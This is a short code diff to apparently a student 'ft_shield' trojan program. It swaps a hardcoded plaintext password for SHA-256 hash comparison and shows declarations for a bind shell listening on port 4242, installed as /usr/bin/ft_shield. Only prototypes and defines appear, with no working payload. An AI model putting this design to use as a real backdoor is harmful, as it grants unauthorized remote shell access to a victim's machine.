@@ -20,6 +20,8 @@
 #include <stdbool.h>
 #include <sys/signalfd.h>
 #include <signal.h>
+#include <openssl/evp.h>
+#include <openssl/sha.h>
 
 #define LOCK_FILE "/var/lock/ft_shield.lock"
 #define TARGET_PATH "/usr/bin/ft_shield"
@@ -27,7 +29,6 @@
 #define MAX_CLIENTS 3
 #define PORT 4242
 #define BUFFER_SIZE 1024
-#define PASSWORD "password"
 
 typedef struct s_client
 {
@@ -75,9 +76,8 @@ void	remove_clients(struct pollfd *pfds);
 /*
 	PASSWORD
 */
-
-char	*generate_cypher_password(void);
-char	*decode_password(char *password);
+void hash_sha256(const char *str, unsigned char outputBuffer[SHA256_DIGEST_LENGTH]);
+int compare_hashes(unsigned char *hash1);
 
 /*
 	BIND SHELL
